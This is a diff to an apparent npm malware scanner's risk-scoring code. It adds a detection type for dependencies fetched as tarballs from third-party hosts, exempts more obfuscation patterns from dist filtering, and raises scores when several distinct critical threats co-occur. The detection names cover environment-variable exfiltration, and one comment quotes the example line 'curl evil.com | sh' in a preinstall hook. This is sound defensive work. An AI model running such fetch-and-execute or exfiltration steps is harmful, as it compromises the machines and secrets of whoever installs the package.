@@ -118,7 +118,9 @@ const PACKAGE_LEVEL_TYPES = new Set([
   'lifecycle_missing_script',
   // v2.10.89: Security review compounds
   'lifecycle_newsletter_hijack', 'lifecycle_env_exfil',
-  'curl_env_exfil', 'version_99_preinstall'
+  'curl_env_exfil', 'version_99_preinstall',
+  // v2.10.94: new package-level type for ltidi chain attack (dep URL on third-party host)
+  'external_tarball_dep'
 ]);
 
 /**
@@ -254,6 +256,8 @@ const DIST_EXEMPT_TYPES = new Set([
   'curl_env_exfil',           // curl/wget env exfil in lifecycle (always malicious)
   'function_constructor_require', // new Function.constructor("require") (always malicious)
   'self_destruct_eval',       // dynamic exec + unlink __filename (csec anti-forensics)
+  'function_runtime_args',    // new Function('require','__dirname','__filename',...) + obfuscation (csec)
+  'external_tarball_dep',     // dep URL tarball on third-party host (ltidi chain)
   // Dangerous shell commands in dist/ are real threats, never bundler output
   'dangerous_exec',
   // Compound scoring rules — co-occurrence signals, never FP
@@ -893,6 +897,16 @@ function calculateRiskScore(deduped, intentResult) {
   // A single "curl evil.com | sh" in preinstall = 25 points = MEDIUM without floor.
   if (packageScore >= 25 && packageLevelThreats.some(t => t.severity === 'CRITICAL')) {
     packageScore = Math.max(packageScore, 50);
+  }
+  // v2.10.94: Co-occurrence floor — 2+ distinct CRITICAL package-level types (different
+  // threat types, not duplicates) is a near-unambiguous malware signature. Lifts to 75
+  // (CRITICAL tier) so the final risk level reflects real severity instead of stopping
+  // at HIGH. Catches apache-arrow-14 (curl_env_exfil + lifecycle_env_exfil compound).
+  const criticalPkgTypes = new Set(
+    packageLevelThreats.filter(t => t.severity === 'CRITICAL').map(t => t.type)
+  );
+  if (criticalPkgTypes.size >= 2) {
+    packageScore = Math.max(packageScore, 75);
   }
 
   // 5. Cross-file bonus: aggregate signal from non-max files
